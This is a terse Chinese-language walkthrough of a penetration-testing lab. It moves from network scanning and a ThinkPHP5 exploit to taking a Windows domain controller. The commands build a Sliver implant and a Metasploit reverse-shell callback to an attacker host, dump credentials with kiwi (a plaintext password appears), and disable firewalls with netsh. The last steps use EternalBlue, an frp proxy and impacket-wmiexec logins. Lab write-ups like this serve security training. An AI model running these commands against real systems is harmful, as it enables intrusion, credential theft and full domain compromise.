端口扫描

arp-scan -l ：获取同网段其他的主机

nmap -p- -A 192.168.135.150 ：端口全部扫描

中间件为apache php版本为5.5.38 主机是windows系统

3306端口开启状态，但是显示属于未认证


尝试连接3389失败


ThinkPHP5

发现web端是TP5框架，可以使用对应的工具（ThinkPHP.jar）

运行要求版本：jdk1.8.0_341


访问payload：直接包含文件内容


GetShell


net config workstation：查看当前用户相关的信息

net group "Domain Admins" /domain：查看当前域管理员

可以通过当前的令牌进行攻击域控


ping 域控，获取当前域控的IP


192.168.138.138：域成员IP


Sliver


new-operator --name hacker --lhost 192.168.135.128：生成文件命令


multiplayer：开启多人运动


cat ~/.sliver/configs/server.json：可以修改客户端连接的端口

generate --mtls 192.168.135.128 --save ./1.exe --os Windows：生成payload


进行监听


上传payload，并且执行


成功建立sesion


shell --shell-path "c:\\windows\\system32\\cmd.exe"


联动MSF

msf -L 192.168.135.128 -m meterpreter_reverse_tcp：发送到msf4444端口

Msf 监听全网卡0.0.0.0:4444


kiwi成功抓取了密码：administrator SUN.COM admin@888


利用session 1 的令牌去攻击DC（192.168.138.138）


netsh advfirewall set allprofiles state off：关闭wind 7 的防火墙


Fscan

上传fscan：upload /home/kali/Desktop/fscan.exe

[*] 192.168.138.138[+]DC SUN\DC Windows Server 2008 HPC Edition 7600


Frp正向代理

meterpreter > execute -f frpc.exe -c ./frpc.ini



再通过永恒之蓝进行上线DC


登录DC

proxychains impacket-wmiexec sum/administrator:admin@888@192.168.138.138

netsh advfirewall set allprofiles state off：关闭DC 防火墙


拿下DC
